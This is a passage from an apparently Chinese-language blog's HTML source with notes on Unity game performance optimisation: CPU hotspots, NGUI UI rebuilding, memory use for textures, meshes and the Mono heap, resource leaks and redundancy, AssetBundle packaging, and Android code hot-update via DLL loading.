</li>\n<li>CPU 占用(帧数占比):这个地方是 4 个图,CPU耗时超过33ms的帧数耗时超过了68%（请注意，UWA的建议是低于10%），超过50ms的帧数耗时达到35%.      </li>\n<li>总体 CPU 耗时走势:如果某条线特别高,需要看下是否可以进行优化,对比测试       </li>\n<li>总内存,堆内存优化:根据不同游戏进行不同的设定,定制一个合理的内存峰值才是正确的,也需要根据不同机器的性能评定.目前Unity所使用的Mono版本有这么个特点,Mono的堆内存一旦分配，就不会返还给系统.这意味着Mono的堆内存是只升不降的.IL2CPP版本在堆内存分配方面和Mono 最大的不同主要是Reserved Total 是可以下降的，而 Mono的 Reserved Total 只会上升不会下降.    </li>\n<li>关于任务列表:UWA 的测评报告还根据性能状态给出了优化任务列表,按照问题的严重程度设置了优先级，并对每个优化任务给出了需要检查或优化的步骤。     </li>\n<li>高 CPU 占用函数:       <blockquote>\n<p>Camera.Render<br>UIPanel.LateUpdate()<br>UnityEngine.SetupCoroutine() <Coroutine- invokemovenext><br>Animators.Update<br>Loading.UpdatePreloading<br>NavMeshManager<br>UICamera.Update()<br>UIRect.Update()<br>Physics.Processing<br>LoadingManager.Update()<br>Monobehaviour.OnMouse_<br>SystemInfoPrinter.Update()<br>TionManager.Update()<br>MeshSkinning.Update<br>AINormalWarrior.Update()<br>Physics.ProcessReports<br>SoundManager.Update()<br>Destroy<br>UIRect.Start()<br>TweenEffectBase.Update()     </Coroutine-></p>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>高堆内存分配函数:     </li>\n</ul>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>UIPanel.LateUpdate()<br>UnityEngine.SetupCoroutine() <Coroutine- invokemovenext><br>UICamera.Update()<br>TionManager.Update()<br>Physics.ProcessReports<br>LoadingManager.Update()<br>Animators.Update<br>BattleWinWnd.ShowContinueTip()<br>CheatManager.Update()<br>Destroy<br>UIRect.Start()<br>DynamicContent.Update()<br>EnemyHintAgent.Update()<br>Loading.UpdatePreloading<br>UIMessageBoxManager.Update()<br>GroupTutorialSystem.Update()<br>iTween.Update()<br>LevelManager.Update()<br>AINormalWarrior.Update()<br>PlayerBattleHUD.LateUpdate()</Coroutine-></p>\n</blockquote>\n</blockquote>\n<hr>\n<h1 id=\"性能优化—CPU篇\"><a href=\"#性能优化—CPU篇\" class=\"headerlink\" title=\"性能优化—CPU篇\"></a>性能优化—CPU篇</h1><ul>\n<li>查看这个性能分析图,总体性能趋势–&gt; <a href=\"https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2\" target=\"_blank\" rel=\"noopener\">https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2</a> </li>\n<li>CPU方面的性能开销主要可归结为两大类：引擎模块性能开销(渲染模块、动画模块、物理模块、UI模块、粒子系统、加载模块和GC调用等等)和自身代码性能开销(第三方,以及 Unity 管理不到的内存)<blockquote>\n<ul>\n<li>渲染模块 :<blockquote>\n<p>（1）降低Draw Call,与维持总线带宽平衡,Draw Call是渲染模块优化方面的重中之重,一般来说，Draw Call越高，则渲染模块的CPU开销越大,降低Draw Call的方法则主要是减少所渲染物体的材质种类,并通过Draw Call Batching(<a href=\"https://docs.unity3d.com/Manual/DrawCallBatching.html)来减少其数量,游戏性能并非Draw\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/DrawCallBatching.html)来减少其数量,游戏性能并非Draw</a> Call越小越好,决定渲染模块性能的除了Draw Call之外，还有用于传输渲染数据的总线带宽.当我们使用Draw Call Batching将同种材质的网格模型拼合在一起时，可能会造成同一时间需要传输的数据（Texture、VB/IB等）大大增加，以至于造成带宽“堵塞”，在资源无法及时传输过去的情况下，GPU只能等待，从而反倒降低了游戏的运行帧率。Draw Call和总线带宽是天平的两端，我们需要做的是尽可能维持天平的平衡，任何一边过高或过低，对性能来说都是无益的。<br>(2) 简化资源,每帧渲染的三角形面片数、网格和纹理资源的具体使用情况    </p>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>UI 模块<blockquote>\n<p>在NGUI的优化方面，UIPanel.LateUpdate为性能优化的重中之重,它是NGUI中CPU开销最大的函数，没有之一.<br>对于UIPanel.LateUpdate的优化，主要着眼于UIPanel的布局，其原则如下：</p>\n<blockquote>\n<ul>\n<li>尽可能将动态UI元素和静态UI元素分离到不同的UIPanel中（UI的重建以UIPanel为单位），从而尽可能将因为变动的UI元素引起的重构控制在较小的范围内；</li>\n<li>尽可能让动态UI元素按照同步性进行划分，即运动频率不同的UI元素尽可能分离放在不同的UIPanel中；</li>\n<li>控制同一个UIPanel中动态UI元素的数量，数量越多，所创建的Mesh越大，从而使得重构的开销显著增加。比如，战斗过程中的HUD运动血条可能会出现较多，此时，建议研发团队将运动血条分离成不同的UIPanel，每组UIPanel下5~10个动态UI为宜。这种做法，其本质是从概率上尽可能降低单帧中UIPanel的重建开销。</li>\n</ul>\n</blockquote>\n</blockquote>\n</li>\n<li>加载模块     <blockquote>\n<p>加载模块的性能开销比较集中，主要出现于场景切换处(前一场景的场景卸载和下一场景的场景加载)，且CPU占用峰值均较高<br>场景卸载情况下的 Destroy,引擎在切换场景时会收集未标识成“DontDestoryOnLoad”的GameObject及其Component，然后进行Destroy。同时，代码中的OnDestory被触发执行，这里的性能开销主要取决于OnDestroy回调函数中的代码逻辑。<br>场景卸载情况下的 Resources.UnloadUnusedAssets 一般情况下，场景切换过程中，该API会被调用两次，一次为引擎在切换场景时自动调用，另一次则为用户手动调用（一般出现在场景加载后，用户调用它来确保上一场景的资源被卸载干净）。在我们测评过的大量项目中，该API的CPU开销主要集中在500ms~3000ms之间。其耗时开销主要取决于场景中Asset和Object的数量，数量越多，则耗时越慢。<br>场景加载情况下的  资源加载,资源加载几乎占据了整个加载过程的90%时间以上，其加载效率主要取决于资源的加载方式（Resource.Load或AssetBundle加载）、加载量（纹理、网格、材质等资源数据的大小）和资源格式（纹理格式、音频格式等）等等。不同的加载方式、不同的资源格式，其加载效率可谓千差万别，所以我们在UWA测评报告中，特别将每种资源的具体使用情况进行展示，以帮助用户可以立刻查找到问题资源并及时进行改正。<br>场景加载情况下的 Instantiate实例化 :在场景加载过程中，往往伴随着大量的Instantiate实例化操作，比如UI界面实例化、角色/怪物实例化、场景建筑实例化等等。在Instantiate实例化时，引擎底层会查看其相关的资源是否已经被加载，如果没有，则会先加载其相关资源，再进行实例化，这其实是大家遇到的大多数“Instantiate耗时问题”的根本原因，这也是为什么我们在之前的AssetBundle文章中所提倡的资源依赖关系打包并进行预加载，从而来缓解Instantiate实例化时的压力（关于AssetBundle资源的加载，则是另一个很大的Story了，我们会在以后的AssetBundle加载技术专题中进行详细的讲解）<br>场景加载情况下的 SerializedField序列化开销 Instantiate实例化的性能开销还体现在脚本代码的序列化上，如果脚本中需要序列化的信息很多，则Instantiate实例化时的时间亦会很长。最直接的例子就是NGUI，其代码中存在很多SerializedField标识，从而在实例化时带来了较多的代码序列化开销。因此，在大家为代码增加序列化信息时，这一点是需要大家时刻关注的</p>\n</blockquote>\n</li>\n<li>代码效率    <blockquote>\n<p>性能开销都遵循着“二八原则”,即80%的性能开销都集中在20%的函数上<br>Camera.Render<br>MovementScript.FixedUpdate()<br>ParticleSystem.Update<br>Physics.Simulate<br>TerrainManager.LoadTerrainObject()[Coroutine:MoveNext]<br>TerrainManager.LoadTerrainSplices()[Coroutine:MoveNext]<br>ParticleSystem.WaitForUpdateThreads()<br>GameStarter.Update()<br>等等</p>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"性能优化，进无止境-内存篇\"><a href=\"#性能优化，进无止境-内存篇\" class=\"headerlink\" title=\"性能优化，进无止境-内存篇\"></a>性能优化，进无止境-内存篇</h1><ul>\n<li>1 内存的开销无外乎以下三大部分:1.Unity资源内存占用；2. Unity引擎模块自身内存占用；3.Unity用户管理内存;4.第三方插件内存(比如 toLua),不属于Unity 。<h3 id=\"一-资源内存占用\"><a href=\"#一-资源内存占用\" class=\"headerlink\" title=\"一:资源内存占用\"></a>一:资源内存占用</h3>在一个较为复杂的大中型项目中，资源的内存占用往往占据了总体内存的70%以上.纹理（Texture）、网格（Mesh）、动画片段（AnimationClip）、音频片段（AudioClip）、材质（Material）、着色器（Shader）、字体资源（Font）以及文本资源（Text Asset）等等.其中，纹理、网格、动画片段和音频片段则是最容易造成较大内存开销的资源<h4 id=\"纹理\"><a href=\"#纹理\" class=\"headerlink\" title=\"纹理\"></a>纹理</h4><blockquote>\n<blockquote>\n<ul>\n<li>纹理资源可以说是几乎所有游戏项目中占据最大内存开销的资源,一个6万面片的场景，网格资源最大才不过10MB，但一个2048x2048的纹理，可能直接就达到16MB.需要优化的点<br>纹理格式:Android平台的ETC、iOS平台的PVRTC、Windows PC上的DXT,具体的采用何种方式对纹理进行操作需要根据项目情况来看.<br>在使用硬件支持的纹理格式时，你可能会遇到以下几个问题：<blockquote>\n<ul>\n<li>色阶问题,由于ETC、PVRTC等格式均为有损压缩，因此，当纹理色差范围跨度较大时，均不可避免地造成不同程度的“阶梯”状的色阶问题。因此，很多研发团队使用RGBA32/ARGB32格式来实现更好的效果。但是，这种做法将造成很大的内存占用。比如，同样一张1024x1024的纹理，如果不开启Mipmap，并且为PVRTC格式，则其内存占用为512KB，而如果转换为RGBA32位，则很可能占用达到4MB。所以，研发团队在使用RGBA32或ARGB32格式的纹理时，一定要慎重考虑，更为明智的选择是尽量减少纹理的色差范围，使其尽可能使用硬件支持的压缩格式进行储存。</li>\n<li>ETC1 不支持透明通道问题,在Android平台上，对于使用OpenGL ES 2.0的设备，其纹理格式仅能支持ETC1格式，该格式有个较为严重的问题，即不支持Alpha透明通道，使得透明贴图无法直接通过ETC1格式来进行储存。对此，我们建议研发团队将透明贴图尽可能分拆成两张，即一张RGB24位纹理记录原始纹理的颜色部分和一张Alpha8纹理记录原始纹理的透明通道部分。然后，将这两张贴图分别转化为ETC1格式的纹理，并通过特定的Shader来进行渲染，从而来达到支持透明贴图的效果。该种方法不仅可以极大程度上逼近RGBA透明贴图的渲染效果，同时还可以降低纹理的内存占用，是我们非常推荐的使用方式。建议:尽量采用 ETC2,在 Android 设备支持OpenGL ES 3.0的上面进行市场分流       </li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<ul>\n<li>纹理尺寸,一般来说，纹理尺寸越大，则内存占用越大。尽可能降低纹理尺寸,如果512x512的纹理对于显示效果已经够用，那么就不要使用1024x1024的纹理.</li>\n<li>Mipmap功能,Mipmap旨在有效降低渲染带宽的压力，提升游戏的渲染效率.开启Mipmap会将纹理内存提升1.33倍.对于具有较大纵深感的3D游戏来说，3D场景模型和角色我们一般是建议开启Mipmap功能的.但是经常会发现部分UI纹理也开启了Mipmap功能,这其实就没有必要的,绝大多数UI均是渲染在屏幕最上层，开启Mipmap并不会提升渲染效率，反倒会增加无谓的内存占用.</li>\n<li>Read &amp; Write 一般情况下，纹理资源的“Read &amp; Write”功能在Unity引擎中是默认关闭的。项目深度优化时发现了不少项目的纹理资源会开启该选项,</li>\n</ul>\n</blockquote>\n</blockquote>\n<h4 id=\"网格\"><a href=\"#网格\" class=\"headerlink\" title=\"网格\"></a>网格</h4><blockquote>\n<blockquote>\n<ul>\n<li>Normal、Color和Tangent,Mesh资源的数据中经常会含有大量的Color数据、Normal数据和Tangent数据,这些数据的存在将大幅度增加Mesh资源的文件体积和内存占用.Color数据和Normal数据主要为3DMax、Maya等建模软件导出时设置所生成，而Tangent一般为导入引擎时生成.更为麻烦的是，如果项目对Mesh进行Draw Call Batching操作的话，那么将很有可能进一步增大总体内存的占用.比如，100个Mesh进行拼合，其中99个Mesh均没有Color、Tangent等属性，剩下一个则包含有Color、Normal和Tangent属性，那么Mesh拼合后，CombinedMesh中将为每个Mesh来添加上此三个顶点属性，进而造成很大的内存开销。需要查看该模型的渲染Shader中是否需要这些数据进行渲染</li>\n<li></li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"二-引擎模块自身占用\"><a href=\"#二-引擎模块自身占用\" class=\"headerlink\" title=\"二:引擎模块自身占用\"></a>二:引擎模块自身占用</h3><blockquote>\n<ul>\n<li>引擎自身中存在内存开销的部分纷繁复杂，可以说是由巨量的“微小”内存所累积起来的,GameObject及其各种Component（最大量的Component应该算是Transform了）,ParticleSystem、MonoScript以及各种各样的模块Manager（SceneManager、CanvasManager、PersistentManager等)…<br>一般情况下，上面所指出的引擎各组成部分的内存开销均比较小，真正占据较大内存开销的是这两处：<strong>WebStream</strong>   <strong>SerializedFile</strong> ,其绝大部分的内存分配则是由AssetBundle加载资源所致,当使用new WWW或CreateFromMemory来加载AssetBundle时，Unity引擎会加载原始数据到内存中并对其进行解压,而WebStream的大小则是AssetBundle原始文件大小 + 解压后的数据大小 + DecompressionBuffer(0.5MB).<br>当你使用LoadFromCacheOrDownload、CreateFromFile或new WWW本地AssetBundle文件时产生的序列化文件.</li>\n</ul>\n</blockquote>\n<blockquote>\n<blockquote>\n<ul>\n<li>是否存在AssetBundle没有被清理干净的情况。开发团队可以通过Unity Profiler直接查看其使用具体的使用情况，并确定Take Sample时AssetBundle的存在是否合理；</li>\n<li>对于占用WebStream较大的AssetBundle文件（如UI Atlas相关的AssetBundle文件等），建议使用LoadFromCacheOrDownLoad或CreateFromFile来进行替换，即将解压后的AssetBundle数据存储于本地Cache中进行使用。这种做法非常适合于内存特别吃紧的项目，即通过本地的磁盘空间来换取内存空间。</li>\n<li>AssetBundle管理机制:<a href=\"https://blog.uwa4d.com/archives/ABTheory.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/ABTheory.html</a></li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"三-托管堆内存占用\"><a href=\"#三-托管堆内存占用\" class=\"headerlink\" title=\"三:托管堆内存占用\"></a>三:托管堆内存占用</h3><blockquote>\n<ul>\n<li>托管堆内存占用,不管是 Mono 版本还是 IL2CPP 版本,这里叫的方便一点,称为 Unity 内置托管虚拟机,其托管堆内存是由Unity 内置托管虚拟机分配和管理的。“托管” 的本意是Unity 内置托管虚拟机可以自动地改变堆的大小来适应你所需要的内存，并且适时地调用垃圾回收（Garbage Collection）操作来释放已经不需要的内存，从而降低开发人员在代码内存管理方面的门槛。</li>\n</ul>\n</blockquote>\n<blockquote>\n<blockquote>\n<ul>\n<li>用户不必要的堆内存分配主要来自于以下几个方面:</li>\n<li>高频率地 New Class/Container/Array等。研发团队切记不要在Update、FixUpdate或较高调用频率的函数中开辟堆内存，这会对你的项目内存和性能均造成非常大的伤害。做个简单的计算，假设你的项目中某一函数每一帧只分配100B的堆内存，帧率是1秒30帧，那么1秒钟游戏的堆内存分配则是3KB，1分钟的堆内存分配就是180KB，10分钟后就已经分配了1.8MB。如果你有10个这样的函数，那么10分钟后，堆内存的分配就是18MB，这期间，它可能会造成Mono的堆内存峰值升高，同时又可能引起了多次GC的调用。在我们的测评项目中，一个函数在10分钟内分配上百MB的情况比比皆是，有时候甚至会分配上GB的堆内存。</li>\n<li>Log输出。我们发现在大量的项目中，仍然存在大量Log输出的情况。建议研发团队对自身Log的输出进行严格的控制，仅保留关键Log，以避免不必要的堆内存分配。对此，我们在UWA测评报告中对Log的输出进行了详细的检测，不仅提供详细的性能开销，同时占用Log输出的调用路径。这样，研发团队可直接通过报告定位和控制Log的输出。</li>\n<li>UIPanel.LateUpdate。这是NGUI中CPU和堆内存开销最大的函数。它本身只是一个函数，但NGUI的大量使用使它逐渐成为了一个不可忽视规则。该函数的堆内存分配和自身CPU开销，其根源上是一致的，即是由UI网格的重建造成。因此，其对应的优化方法是直接查看CPU篇中的UI模块讲解。(1:动静分离在不同的 UIPanel 中,每组UIPanel下5~10个动态UI为宜)</li>\n<li>String连接、部分引擎API（GetComponent）的使用 等等  </li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"内存占用标准\"><a href=\"#内存占用标准\" class=\"headerlink\" title=\"内存占用标准\"></a>内存占用标准</h3><blockquote>\n<ul>\n<li>某些渠道对Android游戏的PSS内存进行了严格的限制。一般要求游戏的PSS内存在200MB以下。这是我们将Reserved Total内存设定在150MB的另外一个重要原因。(旧)<br>pss内存:进程的内存占用情况.有一些内存是多个进程共享的，我们计算的时候如果把这些计算进去进程的内存占用，显然会多算。<br>pss的意思是进程自己独自占有的+共享的/共享的数目。<br>因此如果进程有自己独立的内存100M，和另外一个进程共享10M。<br>那么pss就是100 + 10/2=105</li>\n<li>较为合理的内存分配额度<br>纹理资源     0.33 内存资源<br>网格资源     0.13 内存资源<br>动画片段     0.1  内存资源<br>音频片段     0.1  内存资源<br>Mono内存    0.26 内存资源<br>其他        0.06 内存资源<br>其中如果是 IL2CPP 版本的话,内存是可以返还给系统的,则无需按照这个分配额度进行分配</li>\n</ul>\n</blockquote>\n<h3 id=\"四-内存泄露\"><a href=\"#四-内存泄露\" class=\"headerlink\" title=\"四:内存泄露\"></a>四:内存泄露</h3><blockquote>\n<ul>\n<li>内存泄露的误区:     <blockquote>\n<ul>\n<li>误区一<br>我的项目进出场景前后内存回落不一致，比如进入场景后，内存增加40MB，出来后下降30MB，仍有10MB内存没有返回给系统，即说明内存存在泄露情况。</li>\n<li>误区二<br>我的项目在进出场景前后，Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落（出场景后的PSS值高于进场景前的PSS值），即说明内存存在泄露情况。  </li>\n<li>以上两种情况均不能表明内存存在泄漏问题,造成内存不能完全回落的情况有很多,资源加载后常驻内存以备后续使用,Mono堆内存的只升不降等等,这些均可造成内存无法完全回落</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"五-检查资源的使用情况，特别是纹理、网格等资源的使用\"><a href=\"#五-检查资源的使用情况，特别是纹理、网格等资源的使用\" class=\"headerlink\" title=\"五:检查资源的使用情况，特别是纹理、网格等资源的使用\"></a>五:检查资源的使用情况，特别是纹理、网格等资源的使用</h3><blockquote>\n<ul>\n<li>资源泄漏是内存泄露的主要表现形式，其具体原因是用户对加载后的资源进行了储存（比如放到Container中），但在场景切换时并没有将其Remove或Clear，从而无论是引擎本身还是手动调用Resources.UnloadUnusedAssets等相关API均无法对其进行卸载，进而造成了资源泄露。对于这种情况的排查相当困难，这是因为项目中的资源量过于巨大，泄露资源往往很难定位</li>\n<li>UWA 推出通过资源的“生命周期”属性来快速查看有哪些资源是“常驻”内存的，并且判断该资源是“预加载”资源还是“泄露”资源.推出了资源的“场景比较”功能。建议大家通过以下两种方式进行资源比较，以便更快地找到存在“泄露”问题的资源.<br>一般来说，同种场景或同一场景的资源使用应该是较为固定的，比如游戏项目中的主城场景或主界面场景。通过比较不同时刻同一场景的资源信息，可以快速帮你找到其资源使用的差异情况。这样，你只需判断这些“差异”资源的存在是否合理，即可快速判定是否存在资源泄露，已经具体的泄露资源。<br>除一些常驻资源外，不同类型的场景，其资源使用是完全不同的。比如，游戏中主城和战斗副本的资源，除少部分常驻内存的资源外，二者使用的绝大部分资源应该是不一致的。所以，通过比较两种不同类型的场景，你可以直接查看比较结果中的“共同资源”，并判断其是否确实为预先设定好的常驻资源。如果不是，则它很可能是“泄露”资源，需要你进一步查看项目的资源管理是否存在漏洞。</li>\n</ul>\n</blockquote>\n<h3 id=\"六-通过Profiler来检测WebStream或SerializedFile的使用情况\"><a href=\"#六-通过Profiler来检测WebStream或SerializedFile的使用情况\" class=\"headerlink\" title=\"六:通过Profiler来检测WebStream或SerializedFile的使用情况\"></a>六:通过Profiler来检测WebStream或SerializedFile的使用情况</h3><blockquote>\n<ul>\n<li>AssetBundle的管理不当也会造成一定的内存泄露，即上一场景中使用的AssetBundle在场景切换时没有被卸载掉，而被带入到了下一场场景中。对于这种情况，建议直接通过Profiler Memory中的Take Sample来对其进行检测，通过直接查看WebStream或SerializedFile中的AssetBundle名称，即可判断是否存在“泄露”情况。</li>\n</ul>\n</blockquote>\n<h3 id=\"七-通过Android-PSS-iOS-Instrument反馈的App线程内存来查看\"><a href=\"#七-通过Android-PSS-iOS-Instrument反馈的App线程内存来查看\" class=\"headerlink\" title=\"七:通过Android PSS/iOS Instrument反馈的App线程内存来查看\"></a>七:通过Android PSS/iOS Instrument反馈的App线程内存来查看</h3><blockquote>\n<ul>\n<li>Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落”是有可能的，这是因为Unity Profiler反馈的是引擎的真实分配的物理内存，而PSS中记录的则包括系统的部分缓存。一般情况下，Android或iOS并不会及时将所有App卸载数据进行清理，为了保证下次使用时的流畅性，OS会将部分数据放入到缓存，待自身内存不足时，OS Kernel会启动类似LowMemoryKiller的机制来查询缓存甚至杀死一些进程来释放内存.<br>我们推荐的测试方式是在两个场景之间来回不停切换，比如主城和战斗副本间。理论上来说，多次切换同样的场景，如果Profiler中显示的Unity内存回落正常，那么其PSS/Instrument的内存数值波动范围也是趋于稳定的，但如果出现了PSS/Instrument内存持续增长的情况，则需要大家注意了。这可能有两种可能：<br>Unity引擎自身的内存泄露问题。这种概率很小，之前仅在少数版本中出现过。<br>第三方插件在使用时出现了内存泄露。这种概率较大，因为Profiler仅能对Unity自身的内存进行监控，而无法检测到第三方库的内存分配情况。因此，在出现上述内存问题时，建议大家先对自身使用的第三方库进行排查。     </li>\n</ul>\n</blockquote>\n<h3 id=\"八-无效的Mono堆内存开销\"><a href=\"#八-无效的Mono堆内存开销\" class=\"headerlink\" title=\"八:无效的Mono堆内存开销\"></a>八:无效的Mono堆内存开销</h3><blockquote>\n<ul>\n<li>无效的Mono堆内存。它是Mono所分配的堆内存，但却没有被真正利用上，因此称之为“无效”,如何查看我的项目中是否存在较大量的“无效堆内存”呢？<br>UWA测评报告中:蓝线的Reserved Total为当前项目所占据的总物理内存，而紫线的Used Total为当前项目所使用的总物理内存不一致,Reserved Total - Used Total为空闲内存,而这其中主要由两部分组成，空闲的Unity引擎内存和无效的Mono堆内存.<br>我们应该如何避免或减少过多“无效堆内存”的分配呢？        <blockquote>\n<ul>\n<li>避免一次性堆内存的过大分配。Mono的堆内存也是“按需”逐步进行分配的。但如果一次性开辟过大堆内存，比如New一个较大Container、加载一个过大配置文件等，则势必会造成Mono的堆内存直接冲高，所以研发团队对堆内存的分配需要时刻注意；</li>\n<li>避免不必要的堆内存开销。UWA测评报告中将项目运行过程中堆内存分配Top10函数进行罗列，限于篇幅，我们不再此处进行一一赘述，研发团队可以直接查看之前一篇的内存优化相关文章。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"九-资源冗余\"><a href=\"#九-资源冗余\" class=\"headerlink\" title=\"九:资源冗余\"></a>九:资源冗余</h3><p>在内存管理方面，还有一个大家必须关注的话题——资源冗余。在我们测评过的大量项目中，95%以上的项目均存在不同程度的资源冗余情况。所谓“资源冗余”，是指在某一时刻内存中存在两份甚至多份同样的资源。导致这种情况的出现主要有两种原因：       </p>\n<blockquote>\n<ul>\n<li>1、AssetBundle打包机制出现问题.同一份资源被打入到多份AssetBundle文件中。举个例子，同一张纹理被不同的NPC所使用，同时每个NPC被制作成独立的AssetBundle文件，那么在没有针对纹理进行依赖打包的前提下，就会出现该张纹理出现在不同的NPC AssetBundle文件中。当这些AssetBundle先后被加载到内存后，内存中即会出现纹理资源冗余的情况。对此，我们建议研发团队在发现资源冗余问题后，对相关AssetBundle的制作流程一定要进行检查。同时，我们在UWA测评中为每个资源引入了一个衡量指标——“数量峰值”。它指的是同一资源在同一帧中出现的最大数量。如果大于1，则说明该资源很可能存在 “冗余资源”。大家可以通过这一列进行排序，即可立即查看项目中的资源冗余情况。</li>\n<li>2.资源的实例化所致.在Unity引擎中，当我们修改了一些特定GameObject的资源属性时，引擎会为该GameObject自动实例化一份资源供其使用，比如Material、Mesh等。以Material为例，我们在研发时经常会有这样的做法：在角色被攻击时，改变其Material中的属性来得到特定的受击效果。这种做法则会导致引擎为特定的GameObject重新实例化一个Material，后缀会加上（instance）字样。其本身没有特别大的问题，但是当有改变Material属性需求的GameObject越来越多时（比如ARPG、MMORPG、MOBA等游戏类型），其内存中的冗余数量则会大量增长。如下图所示，随着游戏的进行，实例化的Material资源会增加到333个。虽然Material的内存占用不大，但是过多的冗余资源却为Resources.UnloadUnusedAssets API的调用效率增加了相当大的压力。<br>一般情况下，资源属性的改变情况都是固定的，并非随机出现。比如，假设GameObject受到攻击时，其Material属性改变随攻击类型的不同而有三种不同的参数设置。那么，对于这种需求，我们建议你直接制作三种不同的Material，在Runtime情况下通过代码直接替换对应GameObject的Material，而非改变其Material的属性。这样，你会发现，成百上千的instance Material在内存中消失了，取而代之的，则是这三个不同的Material资源</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"性能优化-AssetBundle-打包\"><a href=\"#性能优化-AssetBundle-打包\" class=\"headerlink\" title=\"性能优化,AssetBundle 打包\"></a>性能优化,AssetBundle 打包</h1><ul>\n<li><a href=\"https://blog.uwa4d.com/archives/ABtopic_2.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/ABtopic_2.html</a><blockquote>\n<ul>\n<li>唯一API,BuildPipeline.BuildAssetBundles,引擎将自动根据资源的assetbundleName属性（以下简称abName）批量打包，自动建立Bundle以及资源之间的依赖关系。</li>\n<li>打包规则,在资源的Inpector界面最下方可设置一个abName，每个abName（包含路径）对应一个Bundle，即abName相同的资源会打在一个Bundle中。如果所依赖的资源设置了不同的abName，则会与之建立依赖关系，避免出现冗余。支持增量式发布，即在资源内容改变并重新打包时，会自动跳过内容未变的Bundle。因此，相比4.x，会极大地缩短更新Bundle的时间。</li>\n<li>5.x下默认开启的三个选项（CompleteAssets ，用于保证资源的完备性；CollectDependencies，用于收集资源的依赖项；DeterministicAssetBundle，用于为资源维护固定ID.对于移动平台，5.x下默认会将TypeTree信息写入AssetBundle，因此在移动平台上DisableWriteTypeTree选项也变得有意义了.</li>\n<li>Manifest文件,5.x中的依赖关系,在打包后生成的文件夹中，每个Bundle都会对应一个manifest文件，记录了Bundle的一些信息，但这类manifest只在增量式打包时才用到；同时，根目录下还会生成一个同名manifest文件及其对应的Bundle文件，通过该Bundle可以在运行时得到一个AssetbundleManifest对象,而所有的Bundle以及各自依赖的Bundle都可以通过该对象提供的接口进行获取.即你打包输出的一个文件里面有个同名的 xxx 和一个 xxx.manifest 通过这2个文件你可以获取到一个AssetbundleManifest对象,用于取出各个 AB 包的依赖关系</li>\n<li>Variant参数,就是Inpector界面最下方最右侧的名字,Variant参数能够让AssetBundle方便地进行“多分辨率支持”,打包时，Variant会作为后缀添加在Bundle名字之后。相同abName，不同variant的Bundle中，资源必须是一一对应的，且他们在Bundle中的ID也是相同的，从而可以起到相互替换的作用。当需要为手机和平板上的某个UI界面使用两套分辨率不同的纹理、Shader，以及文字提示时，借助Variant的特性，只需创建两个文件夹，分别放置两套不同的资源，且资源名一一对应，然后给两个文件夹设置相同的abName和不同的variant，再给UI界面设置abName，然后进行打包即可。运行时，先选择合适的依赖包加载，那么后续加载UI界面时，会根据已加载的依赖包，呈现出相对应的版本。</li>\n<li>abName可通过脚本进行设置和清除，也可以通过构造一个AssetBundleBuild数组来打包。</li>\n<li>开启DisableWriteTypeTree可能造成AssetBundle对Unity版本的兼容问题，但会使Bundle更小，同时也会略微提高加载速度。</li>\n<li>Prefab之间不会建立依赖，即如果Prefab-A和Prefab-B引用了同一张纹理，而他们设置了不同的abName，而共享的纹理并未设置abName，那么Prefab-A和Prefab-B可视为分别打包，各自Bundle中都包含共享的纹理。因此在使用UGUI，开启Sprite Packer时，由于Atlas无法标记abName，在设置UI界面Prefab的abName时就需要注意这个问题。</li>\n<li>5.x中加入了Shader stripping功能,在打包时，默认情况下会根据当前场景的Lightmap及Fog设置对资源中的Shader进行代码剥离。这意味着，如果在一个空场景下进行打包，则Bundle中的Shader会失去对Lightmap和Fog的支持，从而出现运行时Lightmap和Fog丢失的情况.而通过将Edit-&gt;Project Settings-&gt;Graphics下shader Stripping中的modes改为Manual，并勾选相应的mode即可避免这一问题。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"Android平台的代码热更新\"><a href=\"#Android平台的代码热更新\" class=\"headerlink\" title=\"Android平台的代码热更新\"></a>Android平台的代码热更新</h1><ul>\n<li><p>为何不能代码热更新 <a href=\"https://blog.uwa4d.com/archives/HotFix.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/HotFix.html</a></p>\n</li>\n<li><p>Android平台的代码热更新,该原理是解除资源和代码的关系，将代码编译成dll，在游戏一运行时动态加载。</p>\n<blockquote>\n<ul>\n<li>分离.对于脚本我们可以简单地将脚本分为数据(变量)和逻辑(方法)两部分：例如A.cs -&gt; Uwa4dDataA.cs和Uwa4dLogicA.cs。其中Uwa4dDataA.cs中只有成员变量而Uwa4dLogicA.cs和A.cs基本一致。分离后的问题是，依赖了A.cs的资源再也找不到A.cs。因为二者之间的依赖是通过资源文件保存的，所以只需要将资源文件的对于A.cs的依赖替换成 Uwa4dDataA.cs的依赖即可。</li>\n<li>将Uwa4dLogicA.cs编译成Dll,首先将Uwa4dDataA.cs编译成Assembly-CSharp.dll，然后编译Uwa4dLogicA.cs(依赖Assembly-CSharp.dll)，另外要注意编译时.Net的兼容版本。</li>\n<li>加载Uwa4dLogicA.cs<br>加载Uwa4dLogicA.cs编译后的DLL，获得Uwa4dLogicA.cs后通过AddComponent将其挂在相应的资源上，并利用Uwa4dDataA.cs对于其数据进行初始化。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<hr>\n<h1 id=\"Unity纹理加载\"><a 